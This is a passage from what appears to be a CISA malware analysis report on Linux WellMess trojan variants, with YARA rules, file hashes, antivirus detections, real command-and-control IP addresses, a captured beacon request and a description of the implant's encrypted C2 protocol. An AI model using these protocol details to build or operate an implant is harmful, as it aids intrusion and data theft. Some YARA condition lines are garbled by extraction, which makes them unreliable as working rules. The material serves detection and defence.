\"2020-07-06\"\nLast_Modified=\"20200706_1017\"\nActor=\"n/a\"\nCategory=\"Trojan\"\nFamily=\"WellMess\"\nDescription = \"Detects WellMess implant and SangFor Exploit\"\nMD5_1 = \"4d38ac3319b167f6c8acb16b70297111\"\nSHA256_1 = \"7c39841ba409bce4c2c35437ecf043f22910984325c70b9530edf15d826147ee\"\nMD5_2 = \"a32e1202257a2945bf0f878c58490af8\"\nSHA256_2 = \"a4b790ddffb3d2e6691dcacae08fb0bfa1ae56b6c73d70688b097ffa831af064\"\nMD5_3 = \"861879f402fe3080ab058c0c88536be4\"\nSHA256_3 = \"14e9b5e214572cb13ff87727d680633f5ee238259043357c94302654c546cad2\"\nMD5_4 = \"2f9f4f2a9d438cdc944f79bdf44a18f8\"\nSHA256_4 = \"e329607379a01483fc914a47c0062d5a3a8d8d65f777fbad2c5a841a90a0af09\"\nMD5_5 = \"ae7a46529a0f74fb83beeb1ab2c68c5c\"\nSHA256_5 = \"fd3969d32398bbe3709e9da5f8326935dde664bbc36753bd41a0b111712c0950\"\nMD5_6 = \"f18ced8772e9d1a640b8b4a731dfb6e0\"\nSHA256_6 = \"953b5fc9977e2d50f3f72c6ce85e89428937117830c0ed67d468e2d93aa7ec9a\"\nMD5_7 = \"3a9cdd8a5cbc3ab10ad64c4bb641b41f\"\nSHA256_7 = \"5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb\"\nMD5_8 = \"967fcf185634def5177f74b0f703bdc0\"\nSHA256_8 = \"58d8e65976b53b77645c248bfa18c3b87a6ecfb02f306fe6ba4944db96a5ede2\"\nMD5_9 = \"c5d5cb99291fa4b2a68b5ea3ff9d9f9a\"\nSHA256_9 = \"65495d173e305625696051944a36a031ea94bb3a4f13034d8be740982bc4ab75\"\nMD5_10 = \"01d322dcac438d2bb6bce2bae8d613cb\"\nSHA256_10 = \"0c5ad1e8fe43583e279201cdb1046aea742bae59685e6da24e963a41df987494\"\nMD5_11 = \"8777a9796565effa01b03cf1cea9d24d\"\nSHA256_11 = \"83014ab5b3f63b0253cdab6d715f5988ac9014570fa4ab2b267c7cf9ba237d18\"\nMD5_12 = \"507bb551bd7073f846760d8b357b7aa9\"\nSHA256_12 = \"47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854\"\nstrings:\n$0 = \"/home/ubuntu/GoProject/src/bot/botlib/chat.go\"\n$1 = \"/home/ubuntu/GoProject/src/bot/botlib.Post\"\n$2 = \"GoProject/src/bot/botlib.deleteFile\"\n$3 = \"ubuntu/GoProject/src/bot/botlib.generateRandomString\"\n$4 = \"GoProject/src/bot/botlib.AES_Decrypt\"\n$5 = { 53 00 63 00 72 00 69 00 70 00 74 00 00 0F 63 00 6D 00 64 00 2E 00 65 00 78 00 65 00 00 07 2F 00 63 }\n$6 = { 3C 00 6E 00 77 00 3E 00 2E 00 2A 00 29 00 00 0B 24 00 7B 00 66 00 6E 00 7D }\n$7 = { 7B 00 61 00 72 00 67 00 7D 00 00 0B 24 00 7B 00 6E 00 77 00 7D }\n$8 = { 52 61 6E 64 6F 6D 53 74 72 69 6E 67 00 44 65 6C 65 74 65 46 69 6C 65 }\n$9 = \"get_keyRC6\"\n$10 = { 7D A3 26 77 1D 63 3D 5A 32 B4 6F 1F 55 49 44 25 }\n$11 = { 47 C2 2F 35 93 41 2F 55 73 0B C2 60 AB E1 2B 42 }\n$12 = { 53 58 9B 17 1F 45 BD 72 EC 01 30 6C 4F CA 93 1D }\n$13 = { 48 81 21 81 5F 53 3A 64 E0 ED FF 21 23 E5 00 12 }\n$14 = \"GoProject/src/bot/botlib.wellMess\"\n$15 = { 62 6F 74 6C 69 62 2E 4A 6F 69 6E 44 6E 73 43 68 75 6E 6B 73 }\n$16 = { 62 6F 74 6C 69 62 2E 45 78 65 63 }\n$17 = { 62 6F 74 6C 69 62 2E 47 65 74 52 61 6E 64 6F 6D 42 79 74 65 73 }\n$18 = { 62 6F 74 6C 69 62 2E 4B 65 79 }\n$19 = { 7F 16 21 9D 7B 03 CB D9 17 3B 9F 27 B3 DC 88 0F }\n$20 = { D9 BD 0A 0E 90 10 B1 39 D0 C8 56 58 69 74 15 8B }\n$21 = { 44 00 59 00 4A 00 20 00 36 00 47 00 73 00 62 00 59 00 31 00 2E }\n$22 = { 6E 00 20 00 46 00 75 00 7A 00 2C 00 4B 00 5A 00 20 00 33 00 31 00 69 00 6A 00 75 }\n$23 = { 43 00 31 00 69 00 76 00 66 00 39 00 32 00 20 00 56 00 37 00 6C 00 4F 00 48 }\n$24 = { 66 69 6C 65 4E 61 6D 65 3A 28 3F 50 3C 66 6E 3E 2E 2A 3F 29 5C 73 61 72 67 73 3A 28 3F 50 3C 61 72 67 3E 2E 2A 3F }\n$25 = { 5C 00 2E 00 53 00 61 00 6E 00 67 00 66 00 6F 00 72 00 55 00 44 00 2E 00 73 00 75 00 6D }\n$26 = { 66 6F 72 6D 2D 64 61 74 61 3B 20 6E 61 6D 65 3D 22 5F 67 61 22 3B 20 66 69 6C 65 6E 61 6D 65 3D }\n$27 = { 40 5B 5E 5C 73 5D 2B 3F 5C 73 28 3F 50 3C 74 61 72 3E 2E 2A 3F 29 5C 73 27 }\ncondition:\n\n\n-----\n\n($0 a d $ a d $ a d $3 a d $ ) o ($5 a d $6 a d $ a d $8 a d $9) o ($ 0 a d $ ) o ($ a d $ 3) o ($ ) o ($ 5 a d $ 6\nand $17 and $18) or ($19 and $20) or ($21 and $22 and $23) or ($24) or ($25 and $26) or ($27)\n}\n\nssdeep Matches\n\nNo matches found.\n\nRelationships\n\n7c39841ba4... Connected_To 192.48.88.107\n\nDescription\n\nThis artifact is an ELF 64-bit file written in Go. It has been identified as a variant of the WellMess malware family. The program is capable of\nencrypting, decrypting, uploading and downloading files. The malware can also execute commands and send and receive encrypted\ncommunications.\n\nWhen the program is executed, it will attempt to contact its C2 at the IP address, 192.48.88.107 over TCP port 80. The program collects the IP\naddress of the infected system, current username, and domain name to send to the C2. This data string is appended with a unique SHA256\nhash. The completed string is then RC6 encrypted and then Base64 encoded. Non-random characters are interspersed into the Base64 string\nfor further obfuscation. The following is an example of the encoded string:\n\n—Begin Encoded String Example—\n9k90s+7zAwc+UNbXE+oav4+E0s9+aYCt+ICT+pu1e+hre8.+PkzUz+V7%2Cv0cl+V%2CEtY%2CN+bk4+ztw+S0Lg+UDlvkmX9k90s+7zAwc+UNbX\n—End Encoded String Example—\n\nThe string is used to uniquely identify communication to and from the C2. The following is an example of the message format:\n\n—Begin Message Format Example—\n<;head;>3230302e3230302e3230302e3232317c7c757365727c75736572e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852\n<;title;>rc<;title;><;service;><;service;>\n—End Message Format Example—\n\nIn the example, the string ‘rc’ between the <title> delimiters indicates that the bot is waiting for a command. The hexadecimal string between\nthe <head> delimiters is the original encoded string. This string translates to the following:\n\n—Begin String Translated—\n200.200.200.221||user|user\n3230302e3230302e3230302e3232317c7c757365727c75736572e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n—End String Translated—\n\nThe following Public Key is used for secure communication with the C2:\n\n— Begin Public Key—\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAh+WnVdCCA5i8cISqd+wR\nBZxqzhqwF71KW4Z+7yIiH9QeTUtlKYMlwxfre1ZcFM+QIpO9HyH4nJNe26r/nTH8\nxi4lfXomWmXpVs8CnjLe7eQCaFh5BJYbjCDSUopgfex/vxpdI/zDuxYlla8zKk6D\nic184naUNDbzbkR3/SuwV2kxA0EGGdlXi3LAL5aoD8xcR0PUaGuimhJQaO4fASwS\nBZvfx7km3xArlICnqbmrWzqnmh7j7K8eAmXH5pgDwGRR6ctJiS5nz9QlbxMOOhfI\nFKs9by/FpM+rA6gao7AdNTghvNKTVYSMi0U4UeaTSzKgH5EtqwZRXonSXQpk0ySl\nYwIDAQAB\n—End Public Key—\n\n**192.48.88.107**\n\nTags\n\ncommand-and-control\n\nPorts\n\n80 TCP\n\nHTTP Sessions\n\n\n-----\n\nOS / /\nHost: 192.48.88.107\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; zh-CN; rv:1.9.1.8) Gecko/20100216 Fedora/3.5.8-1.fc12 Firefox/3.5.8\nContent-Length: 424\nContent-Type: application/x-www-form-urlencoded; charset=utf-8\nCookie:\nTnKTjksd=f8E+Pt5lxY+is2+wt6+bcu6jw8+9aYCtI+CTpu1eh+re8PkzU+yec.+mfxQxvn+6ml4Z9+K%2CDIgKP+BQHE+5LXS+tQOe+XBUzY+8\nZlttbIG9=+6sd+H2kngW+I90kBVA.+OrUY+tLOuc%2C+mFfoZ+DAc1j+7p9QhJ+e1A+dZC%3A6+G9U.+1GEjt9+QhS+qWm+Rwu7Jf+4nn+XB\nAccept-Encoding: gzip\n\nYY8 UbA0 U7z:bvW 2sqTlfH 1VGk 78N EHW Jcg:r NOyw6l. SmP qvt9FS 5Ybxb4 sfLof9w wWxosmu Jgny TyBx6K v:2r. BXpW vtOeg\nPLl exu7n muk4j7 pw6bgWG,vyS8V I3X. fXHsyy 6dI: z0sErgo Vj4oJ XZB4 ncW52 ieNnER Kaa5Q. XL:,,oxRsgT cMnL LolKz CWa h::\n4RIZT fq:wehz. YBE kNeQXQ oovyQ5 roI KViKu7 geO QK8L UNZHx. BfFwjYU 0O8L 4lAeAx3 OeQwG LVBwk aGvNJ di,QS egx. iftAs\nVHNhsKo Kzw bidAlf msozP paWl7Bm mCcx quHWA. tzqw PEj qdY9RP SxiwZw\n\nWhois\n\nNetRange:   192.48.88.0 - 192.48.91.255\nCIDR:     192.48.88.0/22\nNetName:    TOCICI-NET04\nNetHandle:   NET-192-48-88-0-1\nParent:     NET192 (NET-192-0-0-0-0)\nNetType:    Direct Allocation\nOriginAS:   AS14613\nOrganization: TOCICI LLC (TOCIC)\nRegDate:    2012-12-03\nUpdated:    2012-12-03\nComment:    24hr NOC www.tocici.com\nRef:      https://rdap.arin.net/registry/ip/192.48.88.0\nOrgName:    TOCICI LLC\nOrgId:     TOCIC\nAddress:    25 NW 23PL\nAddress:    STE 6-345\nCity:     Portland\nStateProv:   OR\nPostalCode:   97210\nCountry:    US\nRegDate:    2009-11-16\nUpdated:    2017-01-28\nComment:    http://www.tocici.com\nRef:      https://rdap.arin.net/registry/entity/TOCIC\n\nRelationships\n\n192.48.88.107 Connected_From 7c39841ba409bce4c2c35437ecf043f22910984325c70b9530edf15d826147ee\n\n192.48.88.107 Connected_From fd3969d32398bbe3709e9da5f8326935dde664bbc36753bd41a0b111712c0950\n\nDescription\n\nfd3969d32398bbe3709e9da5f8326935dde664bbc36753bd41a0b111712c0950 and\n7c39841ba409bce4c2c35437ecf043f22910984325c70b9530edf15d826147ee attempts to connect to the IP address.\n\n**fd3969d32398bbe3709e9da5f8326935dde664bbc36753bd41a0b111712c0950**\n\nTags\n\ntrojan\n\nDetails\n\n**Name** fd3969d32398bbe3709e9da5f8326935dde664bbc36753bd41a0b111712c0950\n\n**Size** 4121056 bytes\n\n**Type** ELF 64-bit LSB executable, x86-64, version 1 (SYSV)\n\n**MD5** ae7a46529a0f74fb83beeb1ab2c68c5c\n\n**SHA1** a57c896486564d7663a4dce6fbf723a1deb81378\n\n\n-----\n\n**SHA256** fd3969d32398bbe3709e9da5f8326935dde664bbc36753bd41a0b111712c0950\n\n**SHA512** 85cba60ab37b138c271da13f899ee61434f56b24fa611e294e614f608fb8cf8b912fc59e0e5cd03070f57d01efadddd689edbaa65962f7ccf\n\n**ssdeep** 49152:05RKx7rwGhSA/R/642M91Bj82r4W+26de59I5gj2P4yQmj:q2fwnA/V6g917B6o59Gbj\n\n**Entropy** 5.876729\n\nAntivirus\n\n**Avira** LINUX/Agent.itcql\n\n**BitDefender** Trojan.Linux.Generic.131015\n\n**ClamAV** Unix.Trojan.WellMess-6706034-0\n\n**ESET** a variant of Linux/WellMess.B trojan\n\n**Emsisoft** Trojan.Linux.Generic.131015 (B)\n\n**Ikarus** Trojan.Linux.Agent\n\nYARA Rules\n\n\n-----\n\nu e C S _ 0 96 8 _0 t oja SS\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nDate= \"2020-07-06\"\nLast_Modified=\"20200706_1017\"\nActor=\"n/a\"\nCategory=\"Trojan\"\nFamily=\"WellMess\"\nDescription = \"Detects WellMess implant and SangFor Exploit\"\nMD5_1 = \"4d38ac3319b167f6c8acb16b70297111\"\nSHA256_1 = \"7c39841ba409bce4c2c35437ecf043f22910984325c70b9530edf15d826147ee\"\nMD5_2 = \"a32e1202257a2945bf0f878c58490af8\"\nSHA256_2 = \"a4b790ddffb3d2e6691dcacae08fb0bfa1ae56b6c73d70688b097ffa831af064\"\nMD5_3 = \"861879f402fe3080ab058c0c88536be4\"\nSHA256_3 = \"14e9b5e214572cb13ff87727d680633f5ee238259043357c94302654c546cad2\"\nMD5_4 = \"2f9f4f2a9d438cdc944f79bdf44a18f8\"\nSHA256_4 = \"e329607379a01483fc914a47c0062d5a3a8d8d65f777fbad2c5a841a90a0af09\"\nMD5_5 = \"ae7a46529a0f74fb83beeb1ab2c68c5c\"\nSHA256_5 = \"fd3969d32398bbe3709e9da5f8326935dde664bbc36753bd41a0b111712c0950\"\nMD5_6 = \"f18ced8772e9d1a640b8b4a731dfb6e0\"\nSHA256_6 = \"953b5fc9977e2d50f3f72c6ce85e89428937117830c0ed67d468e2d93aa7ec9a\"\nMD5_7 = \"3a9cdd8a5cbc3ab10ad64c4bb641b41f\"\nSHA256_7 = \"5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb\"\nMD5_8 = \"967fcf185634def5177f74b0f703bdc0\"\nSHA256_8 = \"58d8e65976b53b77645c248bfa18c3b87a6ecfb02f306fe6ba4944db96a5ede2\"\nMD5_9 = \"c5d5cb99291fa4b2a68b5ea3ff9d9f9a\"\nSHA256_9 = \"65495d173e305625696051944a36a031ea94bb3a4f13034d8be740982bc4ab75\"\nMD5_10 = \"01d322dcac438d2bb6bce2bae8d613cb\"\nSHA256_10 = \"0c5ad1e8fe43583e279201cdb1046aea742bae59685e6da24e963a41df987494\"\nMD5_11 = \"8777a9796565effa01b03cf1cea9d24d\"\nSHA256_11 = \"83014ab5b3f63b0253cdab6d715f5988ac9014570fa4ab2b267c7cf9ba237d18\"\nMD5_12 = \"507bb551bd7073f846760d8b357b7aa9\"\nSHA256_12 = \"47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854\"\nstrings:\n$0 = \"/home/ubuntu/GoProject/src/bot/botlib/chat.go\"\n$1 = \"/home/ubuntu/GoProject/src/bot/botlib.Post\"\n$2 = \"GoProject/src/bot/botlib.deleteFile\"\n$3 = \"ubuntu/GoProject/src/bot/botlib.generateRandomString\"\n$4 = \"GoProject/src/bot/botlib.AES_Decrypt\"\n$5 = { 53 00 63 00 72 00 69 00 70 00 74 00 00 0F 63 00 6D 00 64 00 2E 00 65 00 78 00 65 00 00 07 2F 00 63 }\n$6 = { 3C 00 6E 00 77 00 3E 00 2E 00 2A 00 29 00 00 0B 24 00 7B 00 66 00 6E 00 7D }\n$7 = { 7B 00 61 00 72 00 67 00 7D 00 00 0B 24 00 7B 00 6E 00 77 00 7D }\n$8 = { 52 61 6E 64 6F 6D 53 74 72 69 6E 67 00 44 65 6C 65 74 65 46 69 6C 65 }\n$9 = \"get_keyRC6\"\n$10 = { 7D A3 26 77 1D 63 3D 5A 32 B4 6F 1F 55 49 44 25 }\n$11 = { 47 C2 2F 35 93 41 2F 55 73 0B C2 60 AB E1 2B 42 }\n$12 = { 53 58 9B 17 1F 45 BD 72 EC 01 30 6C 4F CA 93 1D }\n$13 = { 48 81 21 81 5F 53 3A 64 E0 ED FF 21 23 E5 00 12 }\n$14 = \"GoProject/src/bot/botlib.wellMess\"\n$15 = { 62 6F 74 6C 69 62 2E 4A 6F 69 6E 44 6E 73 43 68 75 6E 6B 73 }\n$16 = { 62 6F 74 6C 69 62 2E 45 78 65 63 }\n$17 = { 62 6F 74 6C 69 62 2E 47 65 74 52 61 6E 64 6F 6D 42 79 74 65 73 }\n$18 = { 62 6F 74 6C 69 62 2E 4B 65 79 }\n$19 = { 7F 16 21 9D 7B 03 CB D9 17 3B 9F 27 B3 DC 88 0F }\n$20 = { D9 BD 0A 0E 90 10 B1 39 D0 C8 56 58 69 74 15 8B }\n$21 = { 44 00 59 00 4A 00 20 00 36 00 47 00 73 00 62 00 59 00 31 00 2E }\n$22 = { 6E 00 20 00 46 00 75 00 7A 00 2C 00 4B 00 5A 00 20 00 33 00 31 00 69 00 6A 00 75 }\n$23 = { 43 00 31 00 69 00 76 00 66 00 39 00 32 00 20 00 56 00 37 00 6C 00 4F 00 48 }\n$24 = { 66 69 6C 65 4E 61 6D 65 3A 28 3F 50 3C 66 6E 3E 2E 2A 3F 29 5C 73 61 72 67 73 3A 28 3F 50 3C 61 72 67 3E 2E 2A 3F }\n$25 = { 5C 00 2E 00 53 00 61 00 6E 00 67 00 66 00 6F 00 72 00 55 00 44 00 2E 00 73 00 75 00 6D }\n$26 = { 66 6F 72 6D 2D 64 61 74 61 3B 20 6E 61 6D 65 3D 22 5F 67 61 22 3B 20 66 69 6C 65 6E 61 6D 65 3D }\n$27 = { 40 5B 5E 5C 73 5D 2B 3F 5C 73 28 3F 50 3C 74 61 72 3E 2E 2A 3F 29 5C 73 27 }\ncondition:\n\n\n-----\n\n($0 a d $ a d $ a d $3 a d $ ) o ($5 a d $6 a d $ a d $8 a d $9) o ($ 0 a d $ ) o ($ a d $ 3) o ($ ) o ($ 5 a d $ 6\nand $17 and $18) or ($19 and $20) or ($21 and $22 and $23) or ($24) or ($25 and $26) or ($27)\n}\n\nssdeep Matches\n\nNo matches found.\n\nRelationships\n\nfd3969d323... Connected_To 192.48.88.107\n\nDescription\n\nThis artifact is an ELF 64-bit written in Go. It has been identified as a variant of the WellMess malware family.\n\nWhen executed, it attempts to collect the following data from the victim's system:\n\n—Begin Data Collected—\nIP address of the victim system\nCurrent username\nDomain name\n—End Data Collected—\n\nThe data is stored in the following format:\n\n—Begin Format—\n\"200.200.200.150||root|root|e3b0c44298fc1c149afbf4c8996fb924\"\n—End Format—\n\nThe victim's system data is used to generate a unique identifier which is hexadecimal encoded and stored in the format below as a unique\nidentifier of the victim's system:\n\n—Begin Message Format—\n\"\n<;head;>3230302e3230302e3230302e3135307c7c726f6f747c726f6f74e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b8\n<;title;>a:1_0<;title;><;service;>p<;service;>\"\n—End Message Format—\n\nIn the message above, the hexadecimal string between the <head> delimiters is the original encoded string. Data between the <title>\ndelimiters control the session, while data between the <service> delimiters relate to commands. Some of the commands include the following:\n\n—Begin Commands—\n(fu) File upload\n(fd) File download\n(u) Change user-agent string\n—End Commands—\n\nThe message above is encrypted with RC6 using a hard-coded encryption key. The encrypted data is then encoded using the Base64\nencoding function. It trims Base64 \"=\" | \"/\" | \":\" and adds spaces with the \"_/home/ubuntu/GoProject/src/bot/botlib.Base64ToNormal\" function.\n\nThe following is an example of how the Base64 encoded data is trimmed:\n\n—Begin Base64 Encoded Data—\nTnKTjksd=f8E+Pt5lxY+is2+wt6+bcu6jw8+9aYCtI+CTpu1eh+re8PkzU+yec.+mfxQxvn+6ml4Z9+K%2CDIgKP+BQHE+5LXS+tQOe+XBUzY+8qxv.+\nZlttbIG9=+6sd+H2kngW+I90kBVA.+OrUY+tLOuc%2C+mFfoZ+DAc1j+7p9QhJ+e1A+dZC%3A6+G9U.+1GEjt9+QhS+qWm+Rwu7Jf+4nn+XBQ8lsO\n—End Base64 Encoded Data—\n\nThe final trimmed Base64 encoded data is stored in the “Cookie” header. The malware communicates with it C2 server at the IP address\n192.48.88.107 using HTTP requests which are RSA-encrypted and Base64 encoded. The \"Cookie\" header will contain the RC6 encrypted\ninformation, including the system unique identifier, mentioned above. The bottom of the message body will contain a dynamically generated\nAES key, which is encrypted utilizing a hard-coded public RSA key. The AES key will be utilized to secure the transfer of C2 data between the\nremote operator and the malware, including executable scripts, which are executed on the target system.\n\nAnalysis indicates that once a connection is established, the malware is designed to initiate a command and control service from the remote\noperator using the function \"_/home/ubuntu/GoProject/src/bot/botlib.Work\". It performs functions based on the received commands:\n\n—Begin Functions—\nFile upload\nFile download\n\n\n-----\n\nC a ge use age t st g\n—End Functions—\n\nThe following Public Key is used for secure communication with the C2:\n\n—Begin Public Key—\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqU3sMUB/SEWHNe8xNSFG\nDMylqo/BsMvI9OdNb3keEuW57nmFctMiecNZu9c+ZGYTWBSU07cbxU045tlFOprY\nnhbnnnjgEDA9JCA12CUIJ5L74ERo8FuBLC18FoL5QtBrXm65RdxxuP3CRghg0amR\nS5aFpW8p3kpdIINXsXasnjFBw+q009u7w6rDXkK2hrpIvF2fzIrs7DrRwwKJ2lCf\nxgnhY00UWHohjOj3ecQQJMn71puy94pCmpv+7zAyCiYYTNyhC29xUAH1j6aBAVKI\nkuBXqd6461MJkGNI0pdIUev9BDeK74B7vmZ6TbQrdQ27+bNVTg6qqai+6vwLFxUB\nBwIDAQAB\n—End Public Key—\n\n**e329607379a01483fc914a47c0062d5a3a8d8d65f777fbad2c5a841a90a0af09**\n\nTags\n\ntrojan\n\nDetails\n\n**Name** e329607379a01483fc914a47c0062d5a3a8d8d65f777fbad2c5a841a90a0af09\n\n**Size** 6707096 bytes\n\n**Type** ELF 64-bit LSB executable, x86-64, version 1 (SYSV)\n\n**MD5** 2f9f4f2a9d438cdc944f79bdf44a18f8\n\n**SHA1** 709878e13633e44b45ad1ab569ad34e3dc1efd3b\n\n**SHA256** e329607379a01483fc914a47c0062d5a3a8d8d65f777fbad2c5a841a90a0af09\n\n**SHA512** 9626f0896b5a657cd48ccb79fe5701e92b3def3210be596bcf561b8f20f3e7daa532654ab00351fcea7598348a76aa911f3cb8be796d38bc\n\n**ssdeep** 49152:T8FWH8y/gahO9FcIXKtqEJnerv41WHrFq44gP1T1WPmoFjPnMBKBJ2f+r9O1Ogg3:ooHdgaMX1JLFv1opfMABT\n\n**Entropy** 6.006374\n\nAntivirus\n\n**Antiy** Trojan/Linux.Agent\n\n**Avira** LINUX/Agent.vkmrr\n\n**BitDefender** Trojan.Linux.Generic.105878\n\n**ESET** a variant of Linux/WellMess.B trojan\n\n**Emsisoft** Trojan.Linux.Generic.105878 (B)\n\n**Ikarus** Trojan.Linux.Agent\n\n**McAfee** GenericRXKJ-GH!2F9F4F2A9D43\n\n**TrendMicro** TROJ_FR.C35E7E37\n\n**TrendMicro House Call** TROJ_FR.C35E7E37\n\nYARA Rules\n\n\n-----\n\nu e C S _ 0 96 8 _0 t oja SS\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nDate= \"2020-07-06\"\nLast_Modified=\"20200706_1017\"\nActor=\"n/a\"\nCategory=\"Trojan\"\nFamily=\"WellMess\"\nDescription = \"Detects WellMess implant and SangFor Exploit\"\nMD5_1 = \"4d38ac3319b167f6c8acb16b70297111\"\nSHA256_1 = \"7c39841ba409bce4c2c35437ecf043f22910984325c70b9530edf15d826147ee\"\nMD5_2 = \"a32e1202257a2945bf0f878c58490af8\"\nSHA256_2 = \"a4b790ddffb3d2e6691dcacae08fb0bfa1ae56b6c73d70688b097ffa831af064\"\nMD5_3 = \"861879f402fe3080ab058c0c88536be4\"\nSHA256_3 = \"14e9b5e214572cb13ff87727d680633f5ee238259043357c94302654c546cad2\"\nMD5_4 = \"2f9f4f2a9d438cdc944f79bdf44a18f8\"\nSHA256_4 = \"e329607379a01483fc914a47c0062d5a3a8d8d65f777fbad2c5a841a90a0af09\"\nMD5_5 = \"ae7a46529a0f74fb83beeb1ab2c68c5c\"\nSHA256_5 = \"fd3969d32398bbe3709e9da5f8326935dde664bbc36753bd41a0b111712c0950\"\nMD5_6 = \"f18ced8772e9d1a640b8b4a731dfb6e0\"\nSHA256_6 = \"953b5fc9977e2d50f3f72c6ce85e89428937117830c0ed67d468e2d93aa7ec9a\"\nMD5_7 = \"3a9cdd8a5cbc3ab10ad64c4bb641b41f\"\nSHA256_7 = \"5ca4a9f6553fea64ad2c724bf71d0fac2b372f9e7ce2200814c98aac647172fb\"\nMD5_8 = \"967fcf185634def5177f74b0f703bdc0\"\nSHA256_8 = \"58d8e65976b53b77645c248bfa18c3b87a6ecfb02f306fe6ba4944db96a5ede2\"\nMD5_9 = \"c5d5cb99291fa4b2a68b5ea3ff9d9f9a\"\nSHA256_9 = \"65495d173e305625696051944a36a031ea94bb3a4f13034d8be740982bc4ab75\"\nMD5_10 = \"01d322dcac438d2bb6bce2bae8d613cb\"\nSHA256_10 = \"0c5ad1e8fe43583e279201cdb1046aea742bae59685e6da24e963a41df987494\"\nMD5_11 = \"8777a9796565effa01b03cf1cea9d24d\"\nSHA256_11 = \"83014ab5b3f63b0253cdab6d715f5988ac9014570fa4ab2b267c7cf9ba237d18\"\nMD5_12 = \"507bb551bd7073f846760d8b357b7aa9\"\nSHA256_12 = \"47cdb87c27c4e30ea3e2de620bed380d5aed591bc50c49b55fd43e106f294854\"\nstrings:\n$0 = \"/home/ubuntu/GoProject/src/bot/botlib/chat.go\"\n$1 = \"/home/ubuntu/GoProject/src/bot/botlib.Post\"\n$2 = \"GoProject/src/bot/botlib.deleteFile\"\n$3 = \"ubuntu/GoProject/src/bot/botlib.generateRandomString\"\n$4 = \"GoProject/src/bot/botlib.AES_Decrypt\"\n$5 = { 53 00 63 00 72 00 69 00 70 00 74 00 00 0F 63 00 6D 00 64 00 2E 00 65 00 78 00 65 00 00 07 2F 00 63 }\n$6 = { 3C 00 6E 00 77 00 3E 00 2E 00 2A 00 29 00 00 0B 24 00 7B 00 66 00 6E 00 7D }\n$7 = { 7B 00 61 00 72 00 67 00 7D 00 00 0B 24 00 7B 00 6E 00 77 00 7D }\n$8 = { 52 61 6E 64 6F 6D 53 74 72 69 6E 67 00 44 65 6C 65 74 65 46 69 6C 65 }\n$9 = \"get_keyRC6\"\n$10 = { 7D A3 26 77 1D 63 3D 5A 32 B4 6F 1F 55 49 44 25 }\n$11 = { 47 C2 2F 35 93 41 2F 55 73 0B C2 60 AB E1 2B 42 }\n$12 = { 53 58 9B 17 1F 45 BD 72 EC 01 30 6C 4F CA 93 1D }\n$13 = { 48 81 21 81 5F 53 3A 64 E0 ED FF 21 23 E5 00 12 }\n$14 = \"GoProject/src/bot/botlib.wellMess\"\n$15 = { 62 6F 74 6C 69 62 2E 4A 6F 69 6E 44 6E 73 43 68 75 6E 6B 73 }\n$16 = { 62 6F 74 6C 69 62 2E 45 78 65 63 }\n$17 = { 62 6F 74 6C 69 62 2E 47 65 74 52 61 6E 64 6F 6D 42 79 74 65 73 }\n$18 = { 62 6F 74 6C 69 62 2E 4B 65 79 }\n$19 = { 7F 16 21 9D 7B 03 CB D9 17 3B 9F 27 B3 DC 88 0F }\n$20 = { D9 BD 0A 0E 90 10 B1 39 D0 C8 56 58 69 74 15 8B }\n$21 = { 44 00 59 00 4A 00 20 00 36 00 47 00 73 00 62 00 59 00 31 00 2E }\n$22 = { 6E 00 20 00 46 00 75 00 7A 00 2C 00 4B 00 5A 00 20 00 33 00 31 00 69 00 6A 00 75 }\n$23 = { 43 00 31 00 69 00 76 00 66 00 39 00 32 00 20 00 56 00 37 00 6C 00 4F 00 48 }\n$24 = { 66 69 6C 65 4E 61 6D 65 3A 28 3F 50 3C 66 6E 3E 2E 2A 3F 29 5C 73 61 72 67 73 3A 28 3F 50 3C 61 72 67 3E 2E 2A 3F }\n$25 = { 5C 00 2E 00 53 00 61 00 6E 00 67 00 66 00 6F 00 72 00 55 00 44 00 2E 00 73 00 75 00 6D }\n$26 = { 66 6F 72 6D 2D 64 61 74 61 3B 20 6E 61 6D 65 3D 22 5F 67 61 22 3B 20 66 69 6C 65 6E 61 6D 65 3D }\n$27 = { 40 5B 5E 5C 73 5D 2B 3F 5C 73 28 3F 50 3C 74 61 72 3E 2E 2A 3F 29 5C 73 27 }\ncondition:\n\n\n-----\n\n($0 a d $ a d $ a d $3 a d $ ) o ($5 a d $6 a d $ a d $8 a d $9) o ($ 0 a d $ ) o ($ a d $ 3) o ($ ) o ($ 5 a d $ 6\nand $17 and $18) or ($19 and $20) or ($21 and $22 and $23) or ($24) or ($25 and $26) or ($27)\n}\n\nssdeep Matches\n\nNo matches found.\n\nRelationships\n\ne329607379... Connected_To 103.73.188.101\n\nDescription\n\nThis artifact is an ELF 64-bit written in Go. It has been identified as a variant of the WellMess malware family.\n\nWhen executed, it attempts to collect the following data from the victim's system:\n\n—Begin Data Collected—\nIP address of the victim system\nCurrent username\nDomain name\n—End Data Collected—\n\nThe data is stored in the following format:\n\n—Begin Format—\n\"200.200.200.150||root|root|e3b0c44298fc1c149afbf4c8996fb924\"\n—End Format—\n\nThe victim's system data is used to generate a unique identifier for the target system. This unique identifier is hexadecimal encoded and stored\nin the format below:\n\n—Begin Message Format—\n\"\n<;head;>3230302e3230302e3230302e3135307c7c726f6f747c726f6f74e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b8\n<;title;>a:1_0<;title;><;service;>p<;service;>\"\n—End Message Format—\n\nIn the message above, the hexadecimal string between the <head> delimiters is the original encoded string. Data between the <title>\ndelimiters control the session, while data between the <service> delimiters relate to commands. Some of the commands include the following:\n\n—Begin Commands—\n(fu) File upload\n(fd) File download\n(u) Change user-agent string\n—End Commands—\n\nThe message above, is encrypted using a hard-coded RC6 key. This key is loaded using the function \"botlib.KeyRC6\".\n\nDisplayed below is the hard coded RC6 key used to 